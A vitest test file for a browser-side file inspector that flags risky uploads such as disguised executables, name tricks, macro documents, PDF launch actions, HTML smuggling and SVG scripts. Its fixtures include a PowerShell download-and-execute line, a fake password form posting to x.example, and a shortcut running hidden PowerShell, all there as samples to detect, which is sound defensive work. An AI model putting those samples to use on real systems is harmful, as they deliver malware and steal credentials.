import { describe, expect, it } from "vitest";
import { inspectFile, inspectSource, type ByteSource } from "../../src/client/lib/file-inspect";

const rightToLeft = String.fromCodePoint(0x202e);

function source(bytes: Uint8Array): ByteSource {
  return { size: bytes.length, read: async (offset, length) => bytes.slice(offset, offset + length) };
}

function concat(...parts: (Uint8Array | string | number[])[]): Uint8Array {
  const arrays = parts.map((part) => (typeof part === "string" ? new TextEncoder().encode(part) : Uint8Array.from(part)));
  const result = new Uint8Array(arrays.reduce((total, part) => total + part.length, 0));
  let offset = 0;
  for (const part of arrays) {
    result.set(part, offset);
    offset += part.length;
  }
  return result;
}

const le16 = (value: number) => [value & 255, (value >>> 8) & 255];
const le32 = (value: number) => [value & 255, (value >>> 8) & 255, (value >>> 16) & 255, (value >>> 24) & 255];
const utf16 = (text: string) => Uint8Array.from([...text].flatMap((char) => le16(char.charCodeAt(0))));

function pe({ library = false, signed = false } = {}): Uint8Array {
  const bytes = new Uint8Array(1024);
  bytes.set([0x4d, 0x5a]);
  bytes.set(le32(0x80), 0x3c);
  bytes.set([0x50, 0x45, 0, 0], 0x80);
  bytes.set(le16(library ? 0x2102 : 0x0102), 0x80 + 22);
  const optional = 0x80 + 24;
  bytes.set(le16(0x20b), optional);
  bytes.set(le32(16), optional + 108);
  if (signed) {
    bytes.set(le32(0x4000), optional + 112 + 32);
    bytes.set(le32(0x2000), optional + 112 + 36);
  }
  return bytes;
}

function zip(entries: { name: string; encrypted?: boolean }[]): Uint8Array {
  const local = concat([0x50, 0x4b, 0x03, 0x04], new Array(26).fill(0));
  const directory = entries.map((entry) => {
    const name = new TextEncoder().encode(entry.name);
    return concat([0x50, 0x4b, 0x01, 0x02], new Array(4).fill(0), le16(entry.encrypted ? 0x801 : 0x800), le16(8), new Array(16).fill(0), le16(name.length), le16(0), le16(0), new Array(12).fill(0), name);
  });
  const directoryBytes = concat(...directory);
  const end = concat([0x50, 0x4b, 0x05, 0x06], le16(0), le16(0), le16(entries.length), le16(entries.length), le32(directoryBytes.length), le32(local.length), le16(0));
  return concat(local, directoryBytes, end);
}

async function inspect(name: string, bytes: Uint8Array | string) {
  return inspectSource(name, source(typeof bytes === "string" ? new TextEncoder().encode(bytes) : bytes));
}

describe("file inspection on the visitor's device", () => {
  it("recognizes Windows programs by their contents, not their names", async () => {
    expect(await inspect("free_robux.exe", pe())).toMatchObject({ kind: "windows_program", extension: "exe", findings: [] });
    expect(await inspect("helper.dll", pe({ library: true }))).toMatchObject({ kind: "windows_library" });
    expect((await inspect("launcher.exe", pe({ signed: true }))).findings).toEqual(["program_signed"]);
    expect((await inspect("invoice.pdf", pe())).findings).toEqual(["extension_mismatch"]);
  });

  it.each([
    ["photo.jpg.exe", ["double_extension"]],
    [`photo${rightToLeft}gpj.exe`, ["direction_trick"]],
    ["report.pdf                    .exe", ["double_extension", "padded_name"]],
  ])("catches the name trick in %j", async (name, expected) => {
    expect((await inspect(name, pe())).findings).toEqual(expected);
  });

  it("lists what is inside a zip without unpacking it", async () => {
    const report = await inspect("game.zip", zip([{ name: "Game/readme.txt" }, { name: "Game/setup.exe" }, { name: "Game/invoice.pdf.scr" }, { name: "Game/more.zip" }]));
    expect(report.kind).toBe("archive");
    expect(report.findings.sort()).toEqual(["archive_double_extension", "archive_has_program", "archive_nested"]);
    expect(report.insideArchive).toEqual(["setup.exe", "invoice.pdf.scr"]);
    expect((await inspect("locked.zip", zip([{ name: "photos.jpg", encrypted: true }]))).findings).toEqual(["archive_encrypted"]);
  });

  it("recognizes Office files, Android apps, and Minecraft mods inside the zip format", async () => {
    expect(await inspect("cv.docx", zip([{ name: "[Content_Types].xml" }, { name: "word/document.xml" }]))).toMatchObject({ kind: "office_document", findings: [] });
    expect((await inspect("cv.docm", zip([{ name: "[Content_Types].xml" }, { name: "word/vbaProject.bin" }]))).findings).toEqual(["office_macros"]);
    expect((await inspect("free-robux.apk", zip([{ name: "AndroidManifest.xml" }, { name: "classes.dex" }]))).kind).toBe("android_app");
    expect(await inspect("cool-mod.jar", zip([{ name: "META-INF/MANIFEST.MF" }, { name: "fabric.mod.json" }, { name: "a/B.class" }]))).toMatchObject({ kind: "java_archive", findings: ["minecraft_mod"] });
  });

  it("finds actions inside PDFs, including names hidden with hex escapes", async () => {
    expect((await inspect("a.pdf", "%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R /Names << /J#61vaScript 3 0 R >> >>")).findings.sort()).toEqual(["pdf_auto_action", "pdf_javascript"]);
    expect((await inspect("b.pdf", "%PDF-1.4\n<< /S /Launch /F (cmd.exe) >> << /EmbeddedFile 4 0 R >>")).findings.sort()).toEqual(["pdf_embedded_file", "pdf_launch"]);
    expect((await inspect("c.pdf", "%PDF-1.4\n<< /Type /Page /JSON 1 >>")).findings).toEqual([]);
  });

  it("finds fake login pages and hidden downloads in web pages, and scripts in SVG images", async () => {
    expect((await inspect("Invoice.html", '<!DOCTYPE html><form action="https://x.example"><input type="password" name="p"></form>')).findings).toEqual(["html_password_form"]);
    expect((await inspect("doc.htm", "<html><script>const b = new Blob([atob(data)]); URL.createObjectURL(b)</script></html>")).findings).toEqual(["html_smuggling"]);
    expect(await inspect("logo.svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>location = "https://x.example"</script></svg>')).toMatchObject({ kind: "svg_image", findings: ["svg_script"] });
    expect(await inspect("logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>')).toMatchObject({ kind: "svg_image", findings: [] });
  });

  it("flags scripts that download and run more code", async () => {
    expect(await inspect("install.ps1", "IEX (New-Object Net.WebClient).DownloadString('https://x.example/a')")).toMatchObject({ kind: "script", findings: ["script_downloads"] });
    expect(await inspect("hello.bat", "@echo off\necho hello")).toMatchObject({ kind: "script", findings: [] });
  });

  it("recognizes shortcuts that run commands, old Office macros, installers, and disk images", async () => {
    const shortcut = concat([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46], utf16("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden"));
    expect(await inspect("Photo.jpg.lnk", shortcut)).toMatchObject({ kind: "windows_shortcut" });
    expect((await inspect("Photo.jpg.lnk", shortcut)).findings.sort()).toEqual(["double_extension", "shortcut_runs_command"]);
    const office = concat([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], new Array(500).fill(0), utf16("_VBA_PROJECT"));
    expect(await inspect("budget.xls", office)).toMatchObject({ kind: "office_document", findings: ["office_macros"] });
    expect((await inspect("setup.msi", office)).kind).toBe("windows_installer");
    const iso = new Uint8Array(40_000);
    iso.set(new TextEncoder().encode("CD001"), 0x8001);
    expect((await inspect("invoice.iso", iso)).kind).toBe("disk_image");
  });

  it("treats images and plain files as ordinary, and archives it cannot open as unread", async () => {
    expect((await inspect("cat.png", concat([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], new Array(30).fill(0)))).kind).toBe("image");
    expect(await inspect("notes.txt", "just some notes")).toMatchObject({ kind: "other", findings: [] });
    expect(await inspect("pack.rar", concat("Rar!", [0x1a, 0x07, 0x01, 0x00]))).toMatchObject({ kind: "archive", findings: ["archive_unreadable"] });
  });

  it("stays fast on crafted files", async () => {
    const crafted = [
      ["comments.svg", `<?xml version="1.0"?>${"<!-- -->".repeat(200)}${"<!--".repeat(400)}`],
      ["names.pdf", `%PDF-1.4\n${"/A#4".repeat(250_000)}`],
      ["page.html", `<html>${"<form <input type=pass ".repeat(40_000)}`],
      ["run.ps1", `${"curl ".repeat(50_000)}${"-e ".repeat(50_000)}`],
    ] as const;
    for (const [name, content] of crafted) {
      const started = performance.now();
      await inspect(name, content);
      expect(performance.now() - started, name).toBeLessThan(1500);
    }
  });

  it("fingerprints the file with SHA-256 and never sends a name or an odd extension", async () => {
    const bytes = new TextEncoder().encode("hello world");
    const report = await inspectFile(new File([bytes], "My Secret Plans.txt"));
    const expected = [...new Uint8Array(await crypto.subtle.digest("SHA-256", bytes))].map((byte) => byte.toString(16).padStart(2, "0")).join("");
    expect(report.sha256).toBe(expected);
    expect(report.sha256).toBe("b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9");
    expect(JSON.stringify(report)).not.toContain("Secret");
    expect((await inspect("weird.ex\u00e9", pe())).extension).toBeUndefined();
  });
});
